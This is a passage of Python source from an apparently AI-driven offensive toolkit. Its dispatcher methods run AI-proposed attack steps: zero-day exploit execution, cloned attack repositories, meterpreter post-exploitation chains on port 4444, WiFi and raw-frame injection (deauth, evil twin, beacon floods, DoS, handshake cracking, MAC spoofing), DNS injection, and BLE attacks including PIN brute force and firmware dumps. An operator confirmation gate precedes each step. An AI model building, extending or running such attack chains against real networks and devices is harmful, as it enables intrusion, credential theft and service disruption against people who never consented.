                    f"zero_day_execute: exploit {exploit_id} not runnable"
                )
                return
            target = args.get("target") or exploit.target or seed
            res = self.zero_day_exploit_runner.run(
                exploit, target, self.confirm_fn,
            )
            if res.get("cancelled"):
                self._emit("[-] 0-day execute cancelled by operator")
            else:
                self._emit(
                    f"[+] 0-day executed: exit={res.get('exit_code')} "
                    f"executed={res.get('executed')}"
                )
            report["executed"].append({
                "desc": f"zero_day_execute: {exploit_id}",
                "kind": "ai", "action": "zero_day_execute",
                "tool": "zero_day_exploit_runner",
                "result": res,
            })
        except Exception as e:
            self._emit(f"[!] zero_day_execute failed: {e}")
            report["skipped"].append(f"zero_day_execute: {e}")

    def _dispatch_zero_day_algorithm(self, step: Dict[str, Any],
                                       seed: Dict[str, Any],
                                       report: Dict[str, Any]) -> None:
        """Generic dispatcher for one of the 60+ zero-day-algorithm
        chain actions (crash triager, side-channel, fuzz-harness,
        control-flow, patch-differ, memory-class, auth-path,
        crypto-weakness, race, logic, plus the Phase 3a/3b/3c/3d/3e
        expansion covering network protocols, web/API, supply-chain,
        cloud, memory corruption, smart contracts, ML, AI prompt
        injection, DNS rebinding, DLL hijack, Office/PDF, DLT/SCADA,
        TPM/SMM, and JS engine).

        The per-step ACCEPT already fired in :meth:`_walk_ai_step`.
        The algorithm is dispatched via
        :func:`core.ai_backend.zero_day_algorithms.dispatch` which
        returns the standard envelope; the draft is persisted to the
        operator's :class:`ZeroDayDraftStore` so the operator can
        ACK / reject the same way as ``zero_day_propose``.
        """
        action = step.get("action", "zero_day_?")
        try:
            from core.ai_backend import zero_day_algorithms
        except Exception as e:  # noqa: BLE001
            self._emit(
                f"[!] {action} but zero_day_algorithms not importable: {e}"
            )
            report["skipped"].append(f"{action}: import failed: {e}")
            return
        try:
            args = step.get("args", {}) or {}
            target = args.get("target") or seed
            recon = args.get("recon")
            res = zero_day_algorithms.dispatch(
                action, target, recon, args,
                ai_backend=getattr(self, "ai_backend", None),
            )
            if not res.get("ok"):
                self._emit(
                    f"[!] {action} failed: {res.get('error', 'unknown')}"
                )
                report["skipped"].append(
                    f"{action}: {res.get('error', 'unknown')}"
                )
                return
            self._emit(
                f"[+] {action}: draft_id={res.get('draft_id')} "
                f"vulnerability_class={res.get('vulnerability_class')} "
                f"confidence={res.get('confidence')}"
            )
            report["executed"].append({
                "desc": f"{action}: {res.get('draft_id')}",
                "kind": "ai", "action": action,
                "tool": "zero_day_algorithms",
                "result": res,
            })
        except Exception as e:  # noqa: BLE001 — never raise from a chain step
            self._emit(f"[!] {action} raised: {e}")
            report["skipped"].append(f"{action}: {e}")

    def _dispatch_run_toolbox(self, step: Dict[str, Any],
                              seed: Dict[str, Any],
                              report: Dict[str, Any]) -> None:
        """Run a cloned GitHub repo's entry script via
        :func:`core.toolbox.executor.run_toolbox_step`.

        The per-step ACCEPT already fired in :meth:`_walk_ai_step` for
        this step (risk_level is expected to be ``intrusive`` or
        ``destructive``). The executor does NOT re-confirm; it locates
        the repo, detects the entry script, runs it with the
        operator-approved args (credentials routed through env vars per
        the never-inline ground rule), and returns the standard
        envelope. Never raises — failures are surfaced in the report
        with ``ok=False``.
        """
        try:
            from core.toolbox import run_toolbox_step
        except Exception as e:
            self._emit(f"[!] run_toolbox: cannot import executor: {e}")
            report["skipped"].append(f"run_toolbox: import failed: {e}")
            return
        args = step.get("args", {}) or {}
        repo_id = (args.get("repo_id") or "").strip()
        category = (args.get("category") or "").strip()
        if not repo_id or not category:
            self._emit(
                "[!] run_toolbox: missing args.repo_id or args.category"
            )
            report["skipped"].append("run_toolbox: missing repo_id/category")
            return
        self._emit(
            f"[*] run_toolbox: {repo_id} ({category}) "
            f"entry={args.get('entry') or '<auto>'}"
        )
        try:
            res = run_toolbox_step(step, on_event=self._emit)
        except Exception as e:
            self._emit(f"[!] run_toolbox raised: {e}")
            report["skipped"].append(f"run_toolbox: {e}")
            return
        # Surface the result in the report.
        if res.ok:
            self._emit(
                f"[+] run_toolbox: ok rc={res.returncode} "
                f"elapsed={res.elapsed:.1f}s entry={res.entry}"
            )
        else:
            self._emit(
                f"[-] run_toolbox: failed rc={res.returncode} "
                f"error={res.error}"
            )
        report["executed"].append({
            "desc": f"run_toolbox: {repo_id}",
            "kind": "ai", "action": "run_toolbox",
            "tool": "toolbox_executor",
            "result": res.to_dict(),
        })

    def _dispatch_run_python_lib(self, step: Dict[str, Any],
                                 seed: Dict[str, Any],
                                 report: Dict[str, Any]) -> None:
        """Run a Python snippet that imports a curated library from
        :mod:`core.toolbox.python_libs` via
        :func:`core.toolbox.exec_python_lib.run_python_lib_step`.

        The per-step ACCEPT already fired in :meth:`_walk_ai_step`
        for this step (risk_level is expected to be ``intrusive``
        or ``destructive`` for any library whose
        ``requires_explicit_authorization`` is True). The executor
        does NOT re-confirm; it locates the library, runs the
        snippet in a subprocess with the library pre-imported, and
        returns the standard envelope (ok, returncode, stdout,
        stderr, error). Harvested credentials are routed through
        ``env`` per the never-inline ground rule. Never raises —
        failures are surfaced in the report with ``ok=False``.
        """
        try:
            from core.toolbox import run_python_lib_step
        except Exception as e:
            self._emit(
                f"[!] run_python_lib: cannot import executor: {e}"
            )
            report["skipped"].append(
                f"run_python_lib: import failed: {e}"
            )
            return
        args = step.get("args", {}) or {}
        lib = (args.get("lib") or "").strip()
        code = (args.get("code") or "").strip()
        if not lib or not code:
            self._emit(
                "[!] run_python_lib: missing args.lib or args.code"
            )
            report["skipped"].append(
                "run_python_lib: missing lib/code"
            )
            return
        self._emit(
            f"[*] run_python_lib: {lib} "
            f"timeout={args.get('timeout_seconds', 30)}s"
        )
        try:
            res = run_python_lib_step(step)
        except Exception as e:
            self._emit(f"[!] run_python_lib raised: {e}")
            report["skipped"].append(f"run_python_lib: {e}")
            return
        if res.ok:
            self._emit(
                f"[+] run_python_lib: ok rc={res.returncode} "
                f"lib={res.lib} import={res.import_name}"
            )
        else:
            self._emit(
                f"[-] run_python_lib: failed rc={res.returncode} "
                f"error={res.error}"
            )
        report["executed"].append({
            "desc": f"run_python_lib: {lib}",
            "kind": "ai", "action": "run_python_lib",
            "tool": "python_lib_executor",
            "result": res.to_dict(),
        })

    def _dispatch_kismet_scan(self, step: Dict[str, Any],
                               seed: Dict[str, Any],
                               report: Dict[str, Any]) -> None:
        """Drive the Kismet server / client / capture conversion
        via :class:`core.scanners.kismet_runner.KismetRunner`.

        The per-step ACCEPT already fired in :meth:`_walk_ai_step`.
        The runner does NOT re-confirm. Kismet uses
        ``admin`` / ``admin`` (operator-provided); the password
        passes via the ``KISMET_CLIENT_PASSWORD`` env var.
        """
        try:
            from core.scanners.kismet_runner import KismetRunner
        except Exception as e:
            self._emit(f"[!] kismet_scan: cannot import runner: {e}")
            report["skipped"].append(f"kismet_scan: import failed: {e}")
            return
        args = step.get("args", {}) or {}
        interface = (args.get("interface") or "").strip()
        output_dir = (args.get("output_dir") or
                       "workspace/captures/kismet").strip()
        if not interface:
            self._emit("[!] kismet_scan: missing args.interface")
            report["skipped"].append("kismet_scan: missing interface")
            return
        runner = KismetRunner(on_event=self._emit)
        self._emit(
            f"[*] kismet_scan: interface={interface} "
            f"output_dir={output_dir}"
        )
        if not runner.is_installed():
            self._emit(
                "[!] kismet_scan: kismet binary not found on PATH"
            )
            report["skipped"].append("kismet_scan: kismet not installed")
            return
        # Spawn the server. Per-step ACCEPT already fired; we do
        # NOT re-confirm.
        res = runner.start_server(
            interface, output_dir,
            log_types=args.get("log_types", "pcap,netxml,csv"),
            wait_s=float(args.get("wait_s", 6)),
        )
        # Best-effort: also dump the alerts JSON and capture
        # conversion info so the chain has artifacts to chain to.
        artifacts: Dict[str, str] = {}
        if res.ok:
            artifacts.update(res.artifacts)
            # Best-effort alert dump.
            try:
                alerts = runner.dump_alerts_json(output_dir)
                artifacts["alerts_json_files"] = str(
                    alerts.extra.get("n_files", 0)
                )
            except Exception as e:
                self._emit(f"[!] kismet_scan: alerts dump failed: {e}")
        if res.ok:
            self._emit(
                f"[+] kismet_scan: started pid={res.pid} "
                f"output_dir={res.artifacts.get('output_dir')}"
            )
        else:
            self._emit(
                f"[-] kismet_scan: failed error={res.error}"
            )
        report["executed"].append({
            "desc": f"kismet_scan: {interface}",
            "kind": "ai", "action": "kismet_scan",
            "tool": "kismet_runner",
            "result": {"ok": res.ok, "pid": res.pid, "error": res.error,
                        "artifacts": artifacts},
        })

    def _dispatch_auto_post_exploit(self, step: Dict[str, Any],
                                    seed: Dict[str, Any],
                                    report: Dict[str, Any]) -> None:
        """Drive ``run_auto_post_exploit_chain`` on a session-bearing
        exploit success. Builds a session_info dict from the AI step's
        args or the seed; never fakes a session_id (the runner already
        validates)."""
        if self.post_exploit_runner is None:
            # Fall back: build a lazy PostExploitRunner from the AI
            # backend so we don't lose the auto-flow when only the
            # orchestrator has the backend.
            try:
                from core.post_exploit.runner import PostExploitRunner
                self.post_exploit_runner = PostExploitRunner(
                    ai_backend=self.ai_backend, kb=self.kb,
                    confirm_fn=self.confirm_fn,
                )
            except Exception as e:
                self._emit(f"[!] could not build PostExploitRunner: {e}")
                report["skipped"].append("post_exploit (no runner)")
                return

        args = step.get("args", {}) or {}
        session_info = {
            "session_id": args.get("session_id") or seed.get("session_id") or 1,
            "os": args.get("os") or seed.get("os") or "linux",
            "arch": args.get("arch") or seed.get("arch") or "x86_64",
            "type": args.get("type") or seed.get("session_type") or "meterpreter",
            "target": seed.get("bssid") or seed.get("target") or "?",
        }
        try:
            result = self.post_exploit_runner.run_auto_post_exploit_chain(
                session_info=session_info,
                lhost=args.get("lhost", "0.0.0.0"),
                lport=int(args.get("lport", 4444)),
                target_descriptor=seed,
                external_terminal=self.external_terminal,
                on_event=self._emit,
            )
            self._emit(
                f"[+] auto post-exploit: modules={len(result.get('modules', []))} "
                f"terminal={'yes' if result.get('terminal_popen') else 'inline'}"
            )
            report["executed"].append({
                "desc": "auto post-exploit chain",
                "kind": "ai", "action": "post_exploit",
                "tool": "post_exploit_runner",
                "result": result,
            })
            self._record_access(report, report["executed"][-1])
        except Exception as e:
            self._emit(f"[!] auto post-exploit failed: {e}")
            report["skipped"].append(f"post_exploit: {e}")

    def _dispatch_external_terminal(self, step: Dict[str, Any],
                                    seed: Dict[str, Any],
                                    report: Dict[str, Any]) -> None:
        """Spawn a tool in the external terminal.

        The dispatch supports two kinds of ``external_terminal``:

        - A real :class:`core.utils.external_terminal.ExternalTerminalBackend`
          (the dashboard's shared instance). We call its
          ``launch_step(step)`` method, which handles terminal
          selection and persistence.
        - A test double with a ``launch_step(step)`` method. Tests
          inject this to assert on what was launched without
          spawning anything.

        We never call the free ``launch_step`` function from this
        path because it spawns a real subprocess (defeats the
        purpose of an injectable terminal backend).
        """
        term = self.external_terminal
        if term is None or not hasattr(term, "launch_step"):
            self._emit(
                "[!] external_terminal step but no usable terminal "
                "backend wired in; skipping"
            )
            report["skipped"].append(step.get("rationale", "external_terminal"))
            return
        try:
            popen = term.launch_step(step)
            pid = getattr(popen, "pid", None)
            self._emit(f"[+] external terminal launched: pid={pid}")
            report["executed"].append({
                "desc": step.get("rationale", "external_terminal"),
                "kind": "ai", "action": "external_terminal",
                "tool": step.get("tool"),
                "result": {"pid": pid},
            })
        except Exception as e:
            self._emit(f"[!] external_terminal launch failed: {e}")
            report["skipped"].append(f"external_terminal: {e}")

    def _mt7921e_iface(self, seed: Dict[str, Any]) -> Optional[str]:
        """Resolve the monitor iface for an mt7921e step: prefer the
        per-target adapter_caps monitor iface, then the seed's
        ``interface``, then the orchestrator default."""
        caps = seed.get("adapter_caps", {}) or {}
        return caps.get("monitor_iface") or seed.get("interface") or self.interface

    def _dispatch_mt7921e_test_injection(self, step: Dict[str, Any],
                                        seed: Dict[str, Any],
                                        report: Dict[str, Any]) -> None:
        """Run ``mt7921e_tools.test_injection`` on the configured monitor
        iface and record the injection quality. Skipped (with a log
        line) when the seed has no mt7921e adapter cap or no iface."""
        caps = seed.get("adapter_caps", {}) or {}
        iface = self._mt7921e_iface(seed)
        if not iface or not caps.get("mt7921e"):
            self._emit(
                "[-] mt7921e_test_injection: skipped (no mt7921e adapter / no iface)"
            )
            report["skipped"].append(
                "mt7921e_test_injection: no mt7921e adapter / no iface"
            )
            return
        try:
            from core.modules.mt7921e_tools import test_injection
            r = test_injection(
                iface, bssid=seed.get("bssid", "FF:FF:FF:FF:FF:FF"),
            )
            self._emit(
                f"[+] mt7921e_test_injection: quality={r.get('quality')} "
                f"ok={r.get('ok')}"
            )
            report["executed"].append({
                "action": "mt7921e_test_injection",
                "quality": r.get("quality"),
                "ok": r.get("ok"),
            })
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] mt7921e_test_injection failed: {e}")
            report["skipped"].append(f"mt7921e_test_injection: {e}")

    def _dispatch_mt7921e_inject(self, step: Dict[str, Any],
                               seed: Dict[str, Any],
                               report: Dict[str, Any]) -> None:
        """Inject a raw 802.11 frame (or a mode-specific burst) via the
        mt7921e raw-injection path. Args:
          - ``frame_b64``: base64-encoded raw frame → ``inject_raw_frame``.
          - ``mode``: one of deauth | fakeauth | beacon_flood | arp_replay |
            chopchop | fragmentation | cts_rts → ``mt7921e_tools.inject``.
          - else (no mode, no frame_b64): deauth default → ``inject_deauth``
            (back-compat) with ``bssid``/``channel``/``count``.
        Skipped when no mt7921e cap / no iface."""
        caps = seed.get("adapter_caps", {}) or {}
        iface = self._mt7921e_iface(seed)
        if not iface or not caps.get("mt7921e"):
            self._emit(
                "[-] mt7921e_inject: skipped (no mt7921e adapter / no iface)"
            )
            report["skipped"].append(
                "mt7921e_inject: no mt7921e adapter / no iface"
            )
            return
        args = step.get("args", {}) or {}
        try:
            if args.get("frame_b64"):
                from core.modules.mt7921e_tools import inject_raw_frame
                r = inject_raw_frame(
                    iface, args["frame_b64"],
                    channel=args.get("channel") or seed.get("channel"),
                    b64=True,
                )
            else:
                mode = (args.get("mode") or "deauth").strip().lower()
                if mode == "deauth":
                    from core.modules.mt7921e_tools import inject_deauth
                    r = inject_deauth(
                        iface,
                        args.get("bssid") or seed.get("bssid"),
                        channel=args.get("channel") or seed.get("channel"),
                        count=int(args.get("count", 10)),
                        station=args.get("station"),
                    )
                else:
                    from core.modules.mt7921e_tools import inject as mt_inject
                    r = mt_inject(
                        iface,
                        mode=mode,
                        bssid=args.get("bssid") or seed.get("bssid"),
                        station=args.get("station"),
                        channel=args.get("channel") or seed.get("channel"),
                        count=int(args.get("count", 10)),
                        interval_ms=args.get("interval_ms"),
                        ssid=args.get("ssid") or seed.get("ssid"),
                    )
            self._emit(
                f"[+] mt7921e_inject: ok={r.get('ok')} method={r.get('method', mode if 'mode' in locals() else 'raw')}"
            )
            report["executed"].append({
                "action": "mt7921e_inject",
                "ok": r.get("ok"),
                "method": r.get("method"),
                "result": r,
            })
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] mt7921e_inject failed: {e}")
            report["skipped"].append(f"mt7921e_inject: {e}")

    # ------------------------------------------------------------------
    def _dispatch_external_inject(self, step: Dict[str, Any],
                                  seed: Dict[str, Any],
                                  report: Dict[str, Any]) -> None:
        """Drive a standalone injection tool from
        :mod:`core.modules.external_injection` (nemesis / fksvs-inject /
        wpr_tx / cse508 DNS inject / mt7921e firmware research).

        The per-step ACCEPT/CANCEL already fired in
        :meth:`_walk_ai_step` (risk_level wording reflects the tool's
        risk class). Args shape::

            {"tool": "<mcp tool name, e.g. nemesis_inject>",
             "protocol": "<nemesis/inject protocol>",   # for nemesis/inject
             "iface": "<tx interface>",
             "args": {<tool-specific args>}}

        Routes ``tool`` to the matching entrypoint; records the result
        in ``report["executed"]``. Never raises — missing tool / missing
        binary / missing root degrade to a skipped entry with a clear
        error, exactly like :meth:`_dispatch_mt7921e_inject`.
        """
        from core.modules import external_injection as ext

        args = step.get("args", {}) or {}
        tool = (step.get("tool") or args.get("tool") or "").strip()
        # Allow the AI to pass protocol/iface at the top level of args
        # (common shape) OR inside ``args.args`` (nested). Normalize.
        proto = args.get("protocol")
        iface = args.get("iface") or args.get("interface") or seed.get(
            "interface") or self.interface
        inner = args.get("args") if isinstance(args.get("args"), dict) else args

        entry_map = {
            "nemesis_inject": ext.nemesis_inject,
            "inject_tool_inject": ext.inject_tool_inject,
            "wpr_tx": ext.wpr_tx,
            "cse508_dns_inject": ext.cse508_dns_inject,
            "mt7921e_research_firmware": ext.mt7921e_research_firmware,
        }
        fn = entry_map.get(tool)
        if fn is None:
            self._emit(
                f"[-] external_inject: unknown tool {tool!r}; "
                f"one of {list(entry_map)}"
            )
            report["skipped"].append(
                f"external_inject: unknown tool {tool}"
            )
            return

        try:
            if tool in ("nemesis_inject", "inject_tool_inject"):
                if not proto:
                    self._emit(
                        f"[-] external_inject {tool}: protocol required"
                    )
                    report["skipped"].append(
                        f"external_inject {tool}: no protocol"
                    )
                    return
                r = fn(proto, iface=iface, args=inner)
            elif tool == "wpr_tx":
                r = fn(iface=iface,
                       payload_file=inner.get("payload_file"),
                       channel=inner.get("channel"),
                       count=inner.get("count"),
                       extra_args=inner.get("extra_args"))
            elif tool == "cse508_dns_inject":
                r = fn(iface=iface or inner.get("iface"),
                       hostnames=inner.get("hostnames"),
                       expression=inner.get("expression"))
            elif tool == "mt7921e_research_firmware":
                r = fn(target=inner.get("target", "mt7922"),
                       live_test=bool(inner.get("live_test", False)))
            else:
                r = {"ok": False, "error": f"unrouted tool {tool}"}
            self._emit(
                f"[+] external_inject {tool}: ok={r.get('ok')} "
                f"method={r.get('method', '')}"
            )
            report["executed"].append({
                "action": "external_inject",
                "tool": tool,
                "ok": r.get("ok"),
                "method": r.get("method"),
                "result": r,
            })
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] external_inject {tool} failed: {e}")
            report["skipped"].append(f"external_inject {tool}: {e}")

    # ------------------------------------------------------------------
    def _dispatch_recon_probe(self, step: Dict[str, Any],
                              seed: Dict[str, Any],
                              report: Dict[str, Any]) -> None:
        """Run one of the 9 novel passive recon algorithms from
        :mod:`core.modules.catalog_recon` (probe_profile / hidden_ssid /
        signal_map / handshake_harvest / eapol_monitor / channel_plan /
        deauth_detect / gps_wardrive / beacon_parse).

        The algorithm lives IN :mod:`catalog_recon` (not a wrapper around
        a fetched binary); this dispatch just routes the AI step to
        ``catalog_recon.run_probe`` and records the result. The per-step
        ACCEPT/CANCEL already fired in :meth:`_walk_ai_step` — these are
        passive (risk=read) but still operator-gated like every chain
        step. Args shape::

            {"method": "beacon_parse",
             "bssid": "...", "channel": "...", "interface": "...",
             "artifacts": {...}}   # gps_wardrive only

        The returned probe data is merged into ``seed["recon"]`` so the
        re-planner (Part B) sees the new signal when proposing the next
        step. Never raises.
        """
        from core.modules import catalog_recon as crecon
        from core.recon import runner as rrunner

        args = step.get("args", {}) or {}
        method = (args.get("method") or step.get("tool") or "").strip()
        # Permit ``tool`` to carry recon_probe_<method> too.
        if method.startswith("recon_probe_"):
            method = method[len("recon_probe_"):]
        # Phase 1.6.E: the 9 new secondary-pattern-scout methods live
        # in core.recon.runner. They are dispatched through this same
        # action, but their allowed-set is ``ReconRunner.RECON_METHODS``
        # rather than the legacy 9 catalog_recon probes. The
        # per-step ACCEPT/CANCEL gate already fired in
        # :meth:`_walk_ai_step` (single-gate invariant) — we do NOT
        # re-confirm here.
        if method in rrunner.ReconRunner.RECON_METHODS:
            try:
                res = rrunner.run_probe(method=method, args=args)
                ok = bool(res.get("ok"))
                self._emit(
                    f"[+] recon_probe {method}: ok={ok} "
                    f"error={res.get('error') or 'none'}"
                )
                entry = {
                    "desc": f"recon_probe {method}",
                    "kind": "ai", "action": "recon_probe",
                    "tool": f"core.recon.runner.{method}",
                    "method": method,
                    "ok": ok,
                    "result": res,
                }
                report["executed"].append(entry)
                self._record_access(report, entry)
                if ok and isinstance(res.get("data"), dict):
                    seed.setdefault("recon", {})
                    seed["recon"][method] = res.get("data")
            except Exception as e:  # noqa: BLE001
                self._emit(f"[!] recon_probe {method} failed: {e}")
                report["skipped"].append(f"recon_probe {method}: {e}")
            return
        if method not in crecon.CatalogRecon.RECON_PROBE_METHODS:
            self._emit(
                f"[-] recon_probe: unknown method {method!r}; one of "
                f"{list(crecon.CatalogRecon.RECON_PROBE_METHODS)} or "
                f"{list(rrunner.ReconRunner.RECON_METHODS)}"
            )
            report["skipped"].append(f"recon_probe: unknown method {method}")
            return
        target = {
            "bssid": args.get("bssid") or seed.get("bssid"),
            "ssid": args.get("ssid") or seed.get("ssid") or seed.get("essid"),
            "channel": args.get("channel") or seed.get("channel"),
            "interface": (args.get("interface") or args.get("iface")
                          or seed.get("interface") or self.interface),
            "encryption": seed.get("encryption") or seed.get("privacy"),
            "artifacts": args.get("artifacts") or {},
        }
        try:
            res = crecon.run_probe(method=method, target=target,
                                   settings=self.settings)
            ok = bool(res.get("ok"))
            self._emit(
                f"[+] recon_probe {method}: ok={ok} "
                f"error={res.get('error') or 'none'}"
            )
            entry = {
                "desc": f"recon_probe {method}",
                "kind": "ai", "action": "recon_probe",
                "tool": f"catalog_recon.{method}",
                "method": method,
                "ok": ok,
                "result": res,
            }
            report["executed"].append(entry)
            self._record_access(report, entry)
            # Merge the probe data into the seed's recon dict so the
            # re-planner sees the new signal (e.g. pmkid_feasible,
            # is_enterprise, is_wpa3) when proposing the next step.
            if ok and isinstance(res.get("data"), dict):
                seed.setdefault("recon", {})
                seed["recon"][method] = res.get("data")
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] recon_probe {method} failed: {e}")
            report["skipped"].append(f"recon_probe {method}: {e}")

    def _dispatch_ble_probe(self, step: Dict[str, Any],
                             seed: Dict[str, Any],
                             report: Dict[str, Any]) -> None:
        """Run one of the 8 passive BLE recon algorithms from
        :mod:`core.ble.runner` (parse_advertising_data / manufacturer_oracle /
        analyze_location_leak / estimate_battery_profile / map_gatt_services /
        connection_graph_active / calculate_exfil_potential /
        predict_pairing_vulnerability).

        The algorithm lives IN :mod:`core.ble.runner` (not a wrapper around a
        fetched binary); this dispatch routes the AI step to
        ``blerunner.run_probe`` and records the result. The per-step
        ACCEPT/CANCEL already fired in :meth:`_walk_ai_step` — these are
        passive (risk=read) but still operator-gated like every chain step.
        Adapter defaults to hci0 (the U4000 BLUETOOTH adapter dongle). Args shape::

            {"method": "manufacturer_oracle", "adapter": "hci0"}

        The returned probe data is merged into ``seed["ble_recon"]`` so the
        re-planner sees the new signal when proposing the next BLE step.
        Never raises.
        """
        from core.ble import runner as blerunner

        args = step.get("args", {}) or {}
        method = (args.get("method") or step.get("tool") or "").strip()
        # Permit ``tool`` to carry ble_probe_<method> too.
        if method.startswith("ble_probe_"):
            method = method[len("ble_probe_"):]
        if method not in blerunner.BLEProbeRunner.BLE_PROBE_METHODS:
            self._emit(
                f"[-] ble_probe: unknown method {method!r}; one of "
                f"{list(blerunner.BLEProbeRunner.BLE_PROBE_METHODS)}"
            )
            report["skipped"].append(f"ble_probe: unknown method {method}")
            return
        adapter = args.get("adapter") or seed.get("ble_adapter") or "hci0"
        try:
            res = blerunner.run_probe(method=method, adapter=adapter, args=args)
            ok = bool(res.get("ok"))
            self._emit(
                f"[+] ble_probe {method}: ok={ok} "
                f"error={res.get('error') or 'none'}"
            )
            entry = {
                "desc": f"ble_probe {method}",
                "kind": "ai", "action": "ble_probe",
                "tool": f"core.ble.runner.{method}",
                "method": method,
                "ok": ok,
                "result": res,
            }
            report["executed"].append(entry)
            self._record_access(report, entry)
            # Merge the probe data into the seed's ble_recon dict so the
            # re-planner sees the new signal (e.g. ibeacon, gatt services,
            # just_works_likelihood) when proposing the next BLE step.
            if ok and isinstance(res.get("data"), dict):
                seed.setdefault("ble_recon", {})
                seed["ble_recon"][method] = res.get("data")
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] ble_probe {method} failed: {e}")
            report["skipped"].append(f"ble_probe {method}: {e}")

    def _dispatch_ble_attack(self, step: Dict[str, Any],
                             seed: Dict[str, Any],
                             report: Dict[str, Any]) -> None:
        """Run one of the 6 BLE attack / post-exploitation algorithms from
        :mod:`core.ble.attack_runner` (gatt_write_exploit /
        firmware_dump_via_gatt / write_led / write_lock /
        pairing_pin_bruteforce / export_session).

        The algorithm lives IN :mod:`core.ble.attack_runner`; this dispatch
        routes the AI step to ``attack_runner.run_attack`` and records the
        result. These are INTRUSIVE (GATT writes, pairing, firmware dump) —
        the per-step ACCEPT/CANCEL gate already fired in
        :meth:`_walk_ai_step` BEFORE this dispatch runs (single, default-deny
        gate; we do NOT re-confirm here). Args shape::

            {"method": "gatt_write_exploit",
             "address": "<ble MAC>",
             "uuid": "...", "value": "...", "pin_list": [...], ...}

        The returned attack data is merged into ``seed["ble_attack"]`` so
        the re-planner sees the outcome (e.g. recovered_pin, any_accepted)
        when proposing the next step. Never raises."""
        from core.ble import attack_runner as bleattack

        args = step.get("args", {}) or {}
        method = (args.get("method") or step.get("tool") or "").strip()
        if method.startswith("ble_attack_"):
            method = method[len("ble_attack_"):]
        if method not in bleattack.BLEAttackRunner.BLE_ATTACK_METHODS:
            self._emit(
                f"[-] ble_attack: unknown method {method!r}; one of "
                f"{list(bleattack.BLEAttackRunner.BLE_ATTACK_METHODS)}"
            )
            report["skipped"].append(f"ble_attack: unknown method {method}")
            return
        adapter = args.get("adapter") or seed.get("ble_adapter") or "hci0"
        # Carry the orchestrator seed into args so export_session can
        # serialize it when args.session is not explicitly set.
        if "session" not in args:
            args = dict(args)
            args.setdefault("session", seed)
        try:
            res = bleattack.run_attack(method=method, adapter=adapter,
                                        args=args)
            ok = bool(res.get("ok"))
            self._emit(
                f"[+] ble_attack {method}: ok={ok} "
                f"error={res.get('error') or 'none'}"
            )
            entry = {
                "desc": f"ble_attack {method}",
                "kind": "ai", "action": "ble_attack",
                "tool": f"core.ble.attack_runner.{method}",
                "method": method, "ok": ok, "result": res,
            }
            report["executed"].append(entry)
            self._record_access(report, entry)
            # Merge the attack outcome into the seed's ble_attack dict so
            # the re-planner sees it (recovered_pin, any_accepted, bytes_read).
            if isinstance(res.get("data"), dict):
                seed.setdefault("ble_attack", {})
                seed["ble_attack"][method] = res.get("data")
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] ble_attack {method} failed: {e}")
            report["skipped"].append(f"ble_attack {method}: {e}")

    def _dispatch_wifi_attack(self, step: Dict[str, Any],
                               seed: Dict[str, Any],
                               report: Dict[str, Any]) -> None:
        """Run one of the 38 WiFi attack algorithms from
        :mod:`core.wifi_attack.runner` (evil_twin_automated /
        wpa_dragonblood_test / kr00k_vulnerability_check /
        fragmentation_attack / beacon_manipulation_attack / pmf_bypass_test /
        wps_null_pin_attack / band_steering_attack / client_credential_hijack /
        automatic_handshake_cracker / mac_spoofer_rotating /
        captive_portal_detection_and_bypass / sig_strength_prediction_model /
        dynamic_channel_hopping_rf_survey / packet_injection_test /
        wifi_signal_quality_analyzer / wifi_auto_attack_executor /
        pmkid_ai_prioritizer / sae_group_downgrade / targeted_deauth_timing /
        beacon_flood_adaptive / client_power_save_exploit /
        wifi_timing_side_channel / ap_overload_dos / wpa2_kr00k_all_channel /
        ai_driven_wep_attack / full_auto_pwn / karma_mana / mdk3_attack /
        mdk4_attack / eap_downgrade / hashcat_16800 / hashcat_22001 /
        live_hcxdumptool / channel_following_loop / disassociation_frame /
        probe_response_craft / assoc_request_craft).

        The algorithm lives IN :mod:`core.wifi_attack.runner`; this dispatch
        routes the AI step to ``wifi_attack_runner.run_attack`` and records
        the result. These are INTRUSIVE / DESTRUCTIVE (raw frame injection,
        evil-twin hostapd, deauth/disassoc floods, hashcat, hcxdumptool live
        capture, MDK3/4 DoS, MAC spoofing) — the per-step ACCEPT/CANCEL gate
        already fired in :meth:`_walk_ai_step` BEFORE this dispatch runs
        (single, default-deny gate; we do NOT re-confirm here). Args shape::

            {"method": "fragmentation_attack",
             "interface": "wlan0mon", "bssid": "<AP MAC>", "channel": 6,
             "station": "<client MAC>", "cap_file": "...", ...}

        The returned attack data is merged into ``seed["wifi_attack"]`` so
        the re-planner sees the outcome (e.g. cracked_psk, injected count,
        edb_hits, vulnerable_profile) when proposing the next step. Never
        raises."""
        from core.wifi_attack import runner as wifiattack

        args = step.get("args", {}) or {}
        method = (args.get("method") or step.get("tool") or "").strip()
        if method.startswith("wifi_attack_"):
            method = method[len("wifi_attack_"):]
        if method not in wifiattack.WiFiAttackRunner.WIFI_ATTACK_METHODS:
            self._emit(
                f"[-] wifi_attack: unknown method {method!r}; one of "
                f"{list(wifiattack.WiFiAttackRunner.WIFI_ATTACK_METHODS)}")
            report["skipped"].append(f"wifi_attack: unknown method {method}")
            return
        adapter = args.get("adapter") or args.get("interface") \
            or seed.get("wifi_adapter") or seed.get("interface") or "wlan0mon"
        # Carry the orchestrator seed into args so LLM-coordinated executors
        # (wifi_auto_attack_executor / full_auto_pwn) and session-orientated
        # modules can see prior recon/attack outcomes.
        if "session" not in args:
            args = dict(args)
            args.setdefault("session", seed)
        try:
            res = wifiattack.run_attack(method=method, adapter=adapter,
                                          args=args)
            ok = bool(res.get("ok"))
            self._emit(
                f"[+] wifi_attack {method}: ok={ok} "
                f"error={res.get('error') or 'none'}")
            entry = {
                "desc": f"wifi_attack {method}",
                "kind": "ai", "action": "wifi_attack",
                "tool": f"core.wifi_attack.runner.{method}",
                "method": method, "ok": ok, "result": res,
            }
            report["executed"].append(entry)
            self._record_access(report, entry)
            # Merge the attack outcome into the seed's wifi_attack dict so
            # the re-planner sees it (cracked_psk, injected, edb_hits,
            # vulnerable_profile, frames_injected).
            if isinstance(res.get("data"), dict):
                seed.setdefault("wifi_attack", {})
                seed["wifi_attack"][method] = res.get("data")
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] wifi_attack {method} failed: {e}")
            report["skipped"].append(f"wifi_attack {method}: {e}")

